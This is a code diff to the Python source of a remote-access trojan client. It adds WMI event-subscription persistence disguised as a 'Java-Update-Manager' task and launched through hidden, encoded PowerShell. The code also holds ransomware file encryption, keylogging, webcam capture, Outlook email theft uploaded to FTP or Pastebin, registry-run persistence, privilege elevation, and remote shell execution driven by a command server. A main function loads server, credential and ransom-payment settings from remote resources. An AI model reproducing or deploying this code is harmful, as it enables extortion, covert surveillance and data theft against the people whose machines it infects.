@@ -50,45 +50,49 @@ import os
 import sys
 import imp
 import mss
+import cv2
+import wmi
 import time
 import json
 import zlib
 import uuid
 import numpy
+import Queue
 import base64
 import ctypes
 import pickle
-import Queue
 import struct
 import socket
 import random
 import ftplib
 import urllib
+import twilio
+import pyHook
+import pyxhook
 import urllib2
 import marshal
 import zipfile
+import _winreg
+import win32com
+import pythoncom
 import functools
 import threading
 import cStringIO
 import subprocess
-from twilio.rest import Client
-from collections import OrderedDict
-from Crypto.PublicKey import RSA
-from Crypto.Hash import SHA256, HMAC
-from Crypto.Cipher import AES, PKCS1_OAEP
-from Crypto.Util.number import long_to_bytes, bytes_to_long
-from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
-from wmi import WMI
-from pyHook import HookManager
-from pythoncom import PumpMessages, CoInitialize
-from win32com.client import Dispatch
-from win32com.shell.shell import ShellExecuteEx
-from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
-from pyxhook import HookManager
+import collections
+import Crypto.Util
+import Crypto.Hash.HMAC
+import Crypto.Cipher.AES
+import Crypto.Hash.SHA256
+import Crypto.PublicKey.RSA
+import Crypto.Cipher.PKCS1_OAEP
+
 '''.splitlines():
-        try:
-            exec pkg in globals()
-        except ImportError: pass
+    try:
+        exec pkg in globals()
+    except Exception as e:
+        print(str(e))
+
 
 def config(*arg, **options):
     def decorator(function):
@@ -108,15 +112,15 @@ class ClientPayload(object):
     __name__ = 'ClientPayload'
     _abort   = False
     _debug   = True
-    _config  = OrderedDict()
+    _config  = collections.OrderedDict()
     _tasks   = Queue.Queue()
     _lock    = threading.Lock()
 
     def __init__(self, *args, **kwargs):
-        self._workers = OrderedDict()
-        self._results = OrderedDict()
-        self._network = OrderedDict()
-        self._session = OrderedDict()
+        self._workers = collections.OrderedDict()
+        self._results = collections.OrderedDict()
+        self._network = collections.OrderedDict()
+        self._session = collections.OrderedDict()
         self._sysinfo = self._get_sysinfo()
         self._command = self._get_command()
         self._startup = self._get_startup()
@@ -125,7 +129,7 @@ class ClientPayload(object):
     @staticmethod
     def _get_id():
         try:
-            return SHA256.new(ClientPayload._get_public_ip() + ClientPayload._get_mac_address()).hexdigest()
+            return Crypto.Hash.SHA256.new(ClientPayload._get_public_ip() + ClientPayload._get_mac_address()).hexdigest()
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(ClientPayload._get_id.func_name, str(e)))
 
@@ -276,14 +280,14 @@ class ClientPayload(object):
         try:
             key_name, key_value = [str(key_name), str(key_value)]
             run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-            reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
-            SetValueEx(reg_key, key_name, 0, REG_SZ, key_value)
-            CloseKey(reg_key)
+            reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, run_key, 0, _winreg.KEY_WRITE)
+            _winreg.SetValueEx(reg_key, key_name, 0, _winreg.REG_SZ, key_value)
+            _winreg.CloseKey(reg_key)
             if system:
                 run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
-                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
-                SetValueEx(reg_key, '*' + key_name, 0, REG_SZ, key_value)
-                CloseKey(reg_key)
+                reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, run_key, 0, _winreg.KEY_WRITE)
+                _winreg.SetValueEx(reg_key, '*' + key_name, 0, _winreg.REG_SZ, key_value)
+                _winreg.CloseKey(reg_key)
             return True
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(str(e)))
@@ -344,7 +348,7 @@ class ClientPayload(object):
     @staticmethod
     def _get_emails_as_json(emails):
         try:
-            output = OrderedDict()
+            output = collections.OrderedDict()
             while True:
                 try:
                     email = emails.GetNext()
@@ -365,7 +369,7 @@ class ClientPayload(object):
     @staticmethod
     def _get_encryption():
         try:
-            return 'aes' if bool('AES' in globals() and 'SHA256' in globals() and 'HMAC' in globals()) else 'xor'
+            return 'aes' if 'Crypto' in globals() else 'xor'
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(ClientPayload._get_encryption.func_name, str(e)))
 
@@ -447,11 +451,11 @@ class ClientPayload(object):
     @staticmethod
     def _encrypt_aes(plaintext, key):
         try:
-            text        = ClientPayload._get_padded(plaintext, AES.block_size)
-            iv          = os.urandom(AES.block_size)
-            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
+            text        = ClientPayload._get_padded(plaintext, Crypto.Cipher.AES.block_size)
+            iv          = os.urandom(Crypto.Cipher.AES.block_size)
+            cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
             ciphertext  = iv + cipher.encrypt(text)
-            hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
+            hmac_sha256 = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext, digestmod=Crypto.Hash.SHA256).digest()
             return base64.b64encode(ciphertext + hmac_sha256)
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(ClientPayload._encrypt_aes.func_name, str(e)))
@@ -461,12 +465,12 @@ class ClientPayload(object):
     def _decrypt_aes(ciphertext, key):
         try:
             ciphertext  = base64.b64decode(ciphertext)
-            iv          = ciphertext[:AES.block_size]
-            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
-            read_hmac   = ciphertext[-SHA256.digest_size:]
-            calc_hmac   = HMAC.new(key[max(AES.key_size):], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
+            iv          = ciphertext[:Crypto.Cipher.AES.block_size]
+            cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
+            read_hmac   = ciphertext[-Crypto.Hash.SHA256.digest_size:]
+            calc_hmac   = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext[:-Crypto.Hash.SHA256.digest_size], digestmod=Crypto.Hash.SHA256).digest()
             ClientPayload.debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
-            return cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(chr(0))
+            return cipher.decrypt(ciphertext[Crypto.Cipher.AES.block_size:-Crypto.Hash.SHA256.digest_size]).rstrip(chr(0))
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(ClientPayload._decrypt_aes.func_name, str(e)))
 
@@ -562,9 +566,9 @@ class ClientPayload(object):
     def _ransom_encrypt(self, path):
         try:
             if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml']:
-                aes_key = SHA256.new(os.urandom(16)).hexdigest()
+                aes_key = Crypto.Hash.SHA256.new(os.urandom(16)).hexdigest()
                 ransom  = self._encrypt_file(path, key=aes_key)
-                cipher  = PKCS1_OAEP.new(self._session['public_key'])
+                cipher  = Crypto.Cipher.PKCS1_OAEP.new(self._session['public_key'])
                 key     = base64.b64encode(cipher.encrypt(aes_key))
                 task_id = self._task_id(self.ransom.func_name)
                 task    = {'task': task_id, 'client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'ransom encrypt %s' % ransom.replace('/', '?').replace('\\', '?'), 'result': key}
@@ -582,7 +586,7 @@ class ClientPayload(object):
     def _ransom_decrypt(self, args):
         try:
             rsa_key, aes_key, path = args
-            cipher  = PKCS1_OAEP.new(rsa_key)
+            cipher  = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
             aes     = cipher.decrypt(base64.b64decode(aes_key))
             result  = self._decrypt_file(path, key=aes)
             self.debug('%s decrypted' % result)
@@ -619,7 +623,7 @@ class ClientPayload(object):
 
     def _ransom_decrypt_threader(self, private_rsa_key):
         try:
-            rsa_key  = RSA.importKey(private_rsa_key)
+            rsa_key  = Crypto.PublicKey.RSA.importKey(private_rsa_key)
             for key, value in self._results.items():
                 cmd1, _, cmd2 = value.get('command').partition(' ')
                 path = cmd2.partition(' ')[2].replace('?','/')
@@ -640,7 +644,7 @@ class ClientPayload(object):
         try:
             phone_number = '+{}'.format(str().join([i for i in str(phone_number) if str(i).isdigit()]))
             url = 'https://api.twilio.com/2010-04-01/Accounts/{}/Messages'.format(ClientPayload._config['api']['twilio'].get('account_sid'))
-            cli = Client(ClientPayload._config['api']['twilio'].get('account_sid'), ClientPayload._config['api']['twilio'].get('auth_token'))
+            cli = twilio.rest.Client(ClientPayload._config['api']['twilio'].get('account_sid'), ClientPayload._config['api']['twilio'].get('auth_token'))
             msg = cli.api.account.messages.create(to=phone_number, from_=ClientPayload._config['api']['twilio'].get('phone_number'), body=message)
             return "SUCCESS: text message sent to {}".format(phone_number)
         except Exception as e:
@@ -658,9 +662,9 @@ class ClientPayload(object):
 
     def _email_dump(self, *args, **kwargs):
         try:
-            CoInitialize()
+            pythoncom.CoInitialize()
             mode    = args[0] if len(args) else 'ftp'
-            outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = self._get_emails_as_json(inbox.Items)
             return self._upload_ftp(json.dumps(emails), filetype='.txt') if 'ftp' in mode else self._upload_pastebin(json.dumps(emails))
@@ -672,8 +676,8 @@ class ClientPayload(object):
 
     def _email_search(self, string):
         try:
-            CoInitialize()
-            outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            pythoncom.CoInitialize()
+            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = self._get_emails_as_json(inbox.Items)
             for k,v in emails.items():
@@ -688,8 +692,8 @@ class ClientPayload(object):
 
     def _email_count(self, *args, **kwargs):
         try:
-            CoInitialize()
-            outlook = Dispatch('Outlook.Application').GetNameSpace('MAPI')
+            pythoncom.CoInitialize()
+            outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
             inbox   = outlook.GetDefaultFolder(6)
             emails  = inbox.Items
             return "\n\tEmails in Outlook inbox: %d" % len(emails)
@@ -702,13 +706,10 @@ class ClientPayload(object):
     def _keylogger(self, *args, **kwargs):
         while True:
             try:
-                hm = HookManager()
+                hm = pyHook.HookManager() if os.name is 'nt' else pyxhook.HookManager()
                 hm.KeyDown = self._keylogger_event
                 hm.HookKeyboard()
-                if os.name is 'nt':
-                    PumpMessages()
-                else:
-                    time.sleep(0.1)
+                pythoncom.PumpMessages() if os.name is 'nt' else time.sleep(0.1)
             except Exception as e:
                 self.debug('{} error: {}'.format(self._keylogger.func_name, str(e)))
                 break
@@ -840,7 +841,7 @@ class ClientPayload(object):
 
     def _webcam_image(self, *args, **kwargs):
         try:
-            dev = VideoCapture(0)
+            dev = cv2.VideoCapture(0)
             r,f = dev.read()
             dev.release()
             if not r:
@@ -854,11 +855,11 @@ class ClientPayload(object):
     def _webcam_video(self, *args, **kwargs):
         try:
             fpath   = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name is 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
-            fourcc  = VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else VideoWriter_fourcc(*'XVID')
-            output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
+            fourcc  = cv2.VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else cv2.VideoWriter_fourcc(*'XVID')
+            output  = cv2.VideoWriter(fpath, fourcc, 20.0, (640,480))
             length  = float(int([i for i in args if bytes(i).isdigit()][0])) if len([i for i in args if bytes(i).isdigit()]) else 5.0
             end     = time.time() + length
-            dev     = VideoCapture(0)
+            dev     = cv2.VideoCapture(0)
             while True:
                 ret, frame = dev.read()
                 output.write(frame)
@@ -888,7 +889,7 @@ class ClientPayload(object):
                 break
             if not retries:
                 return 'Error: webcam stream unable to connect to server'
-            dev = VideoCapture(0)
+            dev = cv2.VideoCapture(0)
             try:
                 t1 = time.time()
                 while True:
@@ -973,7 +974,7 @@ class ClientPayload(object):
                         hide = subprocess.call('mv {} {}'.format(value, path), shell=True) == 0
                     if hide:
                         if path != value:
-                            ClientPayload._config['dropper'] = bytes(bytes_to_long(self._upload_pastebin(path)[-21:]))
+                            ClientPayload._config['dropper'] = bytes(Crypto.Util.number.bytes_to_long(self._upload_pastebin(path)[-21:]))
                         return (True, path)
                 except Exception as e:        
                     return (False, 'Adding hidden file error: {}'.format(str(e)))
@@ -1175,10 +1176,48 @@ class ClientPayload(object):
         if self.persistence.methods['registry_key'].get('established'):
             value = self.persistence.methods['registry_key'].get('result')
             try:
-                key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
-                DeleteValue(key, name)
-                CloseKey(key)
+                key = OpenKey(_winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, _winreg.KEY_ALL_ACCESS)
+                _winreg.DeleteValue(key, name)
+                _winreg.CloseKey(key)
                 return True
+            except: pass
+        return False
+
+
+    @config(platforms=['win32'])
+    def _persistence_add_wmi_object(self, command=None, task_name='Java-Update-Manager'):
+        try:
+            cmd_line  = ""
+            if self.persistence.methods['payload_dropper'].get('established'):
+                value = self.persistence.methods['payload_dropper'].get('result')
+                if value and os.path.isfile(value):
+                    cmd_line = 'start /b /min {}'.format(value)
+            elif command:
+                cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
+            if len(cmd_line):
+                startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+                powershell = self._get_remote_resource(self._config['resources']['powershell']).replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', task_name)
+                self._get_powershell_exec(powershell)                
+                code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % task_name
+                result = self._get_powershell_exec(code)
+                if task_name in result:
+                    return (True, result)
+        except Exception as e:
+            self.debug('{} error: {}'.format(self._persistence_add_wmi_object.func_name, str(e)))
+        return (False, None)
+
+
+    @config(platforms=['win32'])
+    def _persistence_remove_wmi_object(self, task_name='Java-Update-Manager'):
+        if self.persistence.methods['wmi_object'].get('established'):
+            try:
+                code = """
+                Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
+                Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
+                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject""".replace('[NAME]', task_name)
+                result = self._get_powershell_exec(code)
+                if not result:
+                    return True
             except: pass
         return False
 
@@ -1360,8 +1399,8 @@ class ClientPayload(object):
         try:
             if not len(self.process.buffer.getvalue()):
                 self.process.buffer.write("Time, User , Executable, PID, Privileges")
-            CoInitialize()
-            c = WMI()
+            pythoncom.CoInitialize()
+            c = wmi.WMI()
             process_watcher = c.Win32_Process.watch_for("creation")
             while True:
                 try:
@@ -1494,7 +1533,7 @@ class ClientPayload(object):
                             break
                 if buf and len(bytes(buf)):
                     session_id = self._decrypt_data(buf.rstrip()).strip().rstrip()
-                    if len(str(session_id)) == SHA256.block_size:
+                    if len(str(session_id)) == Crypto.Hash.SHA256.block_size:
                         self.debug("Session ID: {}".format(session_id))
                         return session_id
             else:
@@ -1512,12 +1551,12 @@ class ClientPayload(object):
             if self._session['connection'].wait(timeout=3.0):
                 g  = 2
                 p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-                a  = bytes_to_long(os.urandom(32))
+                a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
                 xA = pow(g, a, p)
-                self._session['socket'].send(long_to_bytes(xA))
-                xB = bytes_to_long(self._session['socket'].recv(256))
+                self._session['socket'].send(Crypto.Util.number.long_to_bytes(xA))
+                xB = Crypto.Util.number.bytes_to_long(self._session['socket'].recv(256))
                 x  = pow(xB, a, p)
-                return SHA256.new(long_to_bytes(x)).hexdigest()
+                return Crypto.Hash.SHA256.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
             else:
                 self.debug("{} timed out".format(self._session_key.func_name))
         except Exception as e:
@@ -1529,7 +1568,7 @@ class ClientPayload(object):
 
     def _task_id(self, task):
         try:
-            return SHA256.new(self._sysinfo['id'] + str(task) + str(time.time())).hexdigest()
+            return Crypto.Hash.SHA256.new(self._sysinfo['id'] + str(task) + str(time.time())).hexdigest()
         except Exception as e:
             self.debug("{} error: {}".format(self._task_id.func_name, str(e)))
 
@@ -1622,6 +1661,13 @@ class ClientPayload(object):
             return "File '{}' not found".format(filepath)
 
 
+    def _get_powershell_exec(code):
+        try:
+            return self.execute('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(code)))
+        except Exception as e:
+            self.debug("{} error: {}".format(self._get_powershell_exec.func_name, str(e)))
+        
+
     def _get_startup(self, **kwargs):
         try:
             methods = self.persistence.methods.keys()
@@ -1692,13 +1738,13 @@ class ClientPayload(object):
                 except socket.timeout:
                     attempt += 1
                     if attempt <= 3:
-                        self.debug("Timed out waiting for RSA Public Key - retrying...\nAttempt: %d" % attempt)
+                        self.debug("Timed out waiting for Crypto.PublicKey.RSA Public Key - retrying...\nAttempt: %d" % attempt)
                         continue
                     else:
                         break
             if raw_buffer and len(str(raw_buffer)):
                 key = self._decrypt_data(str(raw_buffer))
-                rsa = RSA.importKey(key)
+                rsa = Crypto.PublicKey.RSA.importKey(key)
                 return rsa
         except Exception as e:
             self.debug("{} error: {}".format(self._get_public_key.func_name, str(e)))
@@ -2073,15 +2119,15 @@ class ClientPayload(object):
             sys.exit()
 
 
-    @config(platforms=['win32','darwin'], inbox=OrderedDict(), command=True, usage='email <option> [mode]')
+    @config(platforms=['win32','darwin'], inbox=collections.OrderedDict(), command=True, usage='email <option> [mode]')
     def email(self, args=None):
         """
         access Outlook email without opening application
         """       
         if not args:
             try:
-                CoInitialize()
-                installed = Dispatch('Outlook.Application').GetNameSpace('MAPI')
+                pythoncom.CoInitialize()
+                installed = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
                 return "\tOutlook is installed on this host\n\t{}".format(self.email.usage)
             except: pass
             return "Outlook not installed on this host"
@@ -2182,9 +2228,9 @@ class ClientPayload(object):
         try:
             if self._get_administrator():
                 return "Current user '{}' has administrator privileges".format(self._sysinfo.get('username'))
-            if ClientPayload._config['resources'].get('dropper') and os.path.isfile(long_to_bytes(long(ClientPayload._config['resources'].get('dropper')))):
+            if self.persistence.methods['payload_dropper'].get('established') and os.path.isfile(self.persistence.methods['payload_dropper'].get('result')):
                 if os.name is 'nt':
-                    ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(ClientPayload._config['resources'].get('dropper')))))
+                    win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.persistence.methods['payload_dropper'].get('result')))
                 else:
                     return "Privilege escalation not yet available on '{}'".format(sys.platform)
         except Exception as e:
@@ -2284,25 +2330,42 @@ class ClientPayload(object):
                 return self.persistence.usage
             else:
                 cmd, _, method = str(args).partition(' ')
-                if not method or cmd not in ('add','remove'):
-                    return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(self, k).platforms]))
+                if cmd not in ('add','remove'):
+                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in self.persistence.methods if sys.platform in getattr(ClientPayload, '_persistence_add_%s' % m).platforms]))
                 elif method == 'all':
-                    self._persistence_check()
-                    for method in [_ for _ in self.persistence.methods if 'payload_dropper' != method if not self.persistence.methods[_]['established']]:
-                        target = '_persistence_{}_{}'.format(cmd, method)
-                        if sys.platform in getattr(self, target).platforms:
-                            self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target)()
-                    return json.dumps({k: v for k,v in self.persistence.methods if sys.platform in getattr(self, k).platforms})
+                    if cmd  == 'add':
+                        self._persistence_check()
+                        for method in self.persistence.methods:
+                            if not self.persistence.methods[method].get('established'):
+                                target = '_persistence_add_{}'.format(method)
+                                if sys.platform in getattr(self, target).platforms:
+                                    self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target)()
+                    elif cmd == 'remove':
+                        for method in self.persistence.methods:
+                            if self.persistence.methods[method].get('established'):
+                                target = '_persistence_remove_{}'.format(method)
+                                if sys.platform in getattr(self, target).platforms:
+                                    if getattr(self, target)():
+                                        self.persistence.methods[method]['established'] = False
+                                        self.persistence.methods[method]['result'] = None
+                                    else:
+                                        self.debug("Failed to remove persistence method: {}".format(method))
+                    else:
+                        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(ClientPayload, '_persistence_add_%s' % m).platforms]))
+                    return json.dumps({k: v.get('result') for k,v in self.persistence.methods.items() if sys.platform in getattr(ClientPayload, '_persistence_add_%s' % k).platforms})
                 elif method in self.persistence.methods:
                     if self.persistence.methods[method].get('established'):
                         return json.dumps(self.persistence.methods[method])
-                    self._persistence_check()
-                    target = '_persistence_{}_{}'.format(cmd, method)
-                    if sys.platform in getattr(self, target).platforms:
-                        self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target)()
-                    return json.dumps(self.persistence.methods[method])
-                else:
-                    return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(self, k).platforms]))
+                    else:
+                        if cmd == 'add':
+                            self._persistence_check()
+                            target = '_persistence_add_{}'.format(method)
+                            if sys.platform in (ClientPayload, target).platforms:
+                                self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target)()
+                        elif cmd == 'remove':
+                            target = '_persistence_remove_{}'.format(method)
+                    return json.dumps({method: v for k,v in self.persistence.methods[method].items() if 'result' in k})
+                return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(ClientPayload, '_persistence_add_%s' % m).platforms]))
         except Exception as e:
             self.debug("{} error: '{}'".format(self.persistence.func_name, str(e)))
 
@@ -2363,19 +2426,8 @@ class ClientPayload(object):
                     if not self._session['prompt'].is_set():
                         task = self._server_recv()
                         if task:
-                            result  = ""
                             cmd, _, action  = bytes(task['command']).partition(' ')
-                            if cmd in self._command:
-                                try:
-                                    result  = bytes(self._command[cmd]['method'](action)) if len(action) else bytes(self._command[cmd]['method']())
-                                except Exception as e1:
-                                    result  = "Error: %s" % bytes(e1)
-                            else:
-                                try:
-                                    result  = bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-                                except Exception as e2:
-                                    result  = "Error: %s" % bytes(e2)
-                                    
+                            result  = bytes(self._command[cmd]['method'](action)) if len(action) else bytes(self._command[cmd]['method']()) if cmd in self._command else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                             if result and result != "None":
                                 task.update({'result': result})
                                 if cmd in ClientPayload._config['tasks'] and 'PRIVATE KEY' not in task['command']:
@@ -2447,3 +2499,87 @@ class ClientPayload(object):
 
 
 
+
+def main(*args, **kwargs):
+    ClientPayload._config.update({'api': {}, 'tasks': {}, 'resources': {}})
+#    if 'w' in kwargs or 'x' in kwargs:
+#        exec "import os, sys, urllib" in globals()
+#        imports = kwargs.get('w' if os.name is 'nt' else 'x')
+#        imports = ClientPayload._get_remote_resource(imports)
+#        for package in imports.splitlines():
+#            try:
+#                exec package in globals()
+#            except ImportError: pass
+    if 'b' in kwargs:
+        b   =  kwargs.get('b')
+        api_endpoint, api_key = ClientPayload._get_remote_resource(b).splitlines()
+        ClientPayload._config['api']['server'] = {'endpoint': api_endpoint, 'api_key': api_key}
+    if 'q' in kwargs:
+        q = kwargs.get('q')
+        ftp_host, ftp_user, ftp_passwd  = ClientPayload._get_remote_resource(q).splitlines()
+        ClientPayload._config['api']['ftp'] = {'hostname': ftp_host, 'username': ftp_user, 'password': ftp_passwd}
+    if 'c' in kwargs:
+        c = kwargs.get('c')
+        pastebin_api_key, pastebin_user_key = ClientPayload._get_remote_resource(c).splitlines()
+        ClientPayload._config['api']['pastebin'] = {'api_dev_key': pastebin_api_key, 'api_user_key': pastebin_user_key}
+    if 'o' in kwargs:
+        o = kwargs.get('o')
+        twilio_sid, twilio_token, twilio_phone = ClientPayload._get_remote_resource(o).splitlines()
+        ClientPayload._config['api']['twilio'] = {'account_sid': twilio_sid, 'auth_token': twilio_token, 'phone_number': twilio_phone}
+    if 'd' in kwargs:
+        d = kwargs.get('d')
+        imgur_api_key= ClientPayload._get_remote_resource(d)
+        ClientPayload._config['api']['imgur']  = {'api_key': imgur_api_key}
+    if 'p' in kwargs:
+        p = kwargs.get('p')
+        ransom_payment_url = ClientPayload._get_remote_resource(p)
+        ClientPayload._config['api']['coinbase'] = ransom_payment_url
+    if 's' in kwargs:
+        s = kwargs.get('s')
+        powershell_script = ClientPayload._get_remote_resource(s)
+        ClientPayload._config['resources']['powershell'] = powershell_script
+    if 'l' in kwargs:
+        l = kwargs.get('l')
+        code = ClientPayload._get_remote_resource(l)
+        ClientPayload._config['resources']['dropper'] = {'code': code}
+        if 'r' in kwargs:
+            r = kwargs.get('r')
+            config = ClientPayload._get_remote_resource(r)
+            config = json.loads(config)
+            ClientPayload._config['resources']['dropper'].update({'config': config})
+    if 'g' in kwargs:
+        g = kwargs.get('g')
+        bash = ClientPayload._get_remote_resource(g)
+        ClientPayload._config['resources']['bash'] = bash
+    if 'v' in kwargs:
+        v = kwargs.get('v')
+        tasks = ClientPayload._get_remote_resource(v).splitlines()
+        ClientPayload._config['tasks'] = tasks
+    dbg = '--debug' in sys.argv
+    payload = ClientPayload(debug=dbg)
+    #payload.run()
+    return payload
+
+
+
+if __name__ == '__main__':
+    m = main(**{
+  "a": "80914767869984994101",
+  "b": "81266016987952607600",
+  "c": "78671681703351507562",
+  "d": "79030013784106676584",
+  "g": "79328323225122003561",
+  "j": "76650156158318301560",
+  "l": "81040047328712224353",
+  "o": "76297441489967984739",
+  "p": "80692935077109257793",
+  "q": "80324520337976078676",
+  "r": "81126388790932157784",
+  "s": "81340939681778199109",
+  "t": "79310384705633414777",
+  "u": "76299683425183950643",
+  "v": "79169592366247143984",
+  "x": "81130103993010639714",
+  "w": "77888090548015223857",
+  "z": "79892739118577505130"
+})
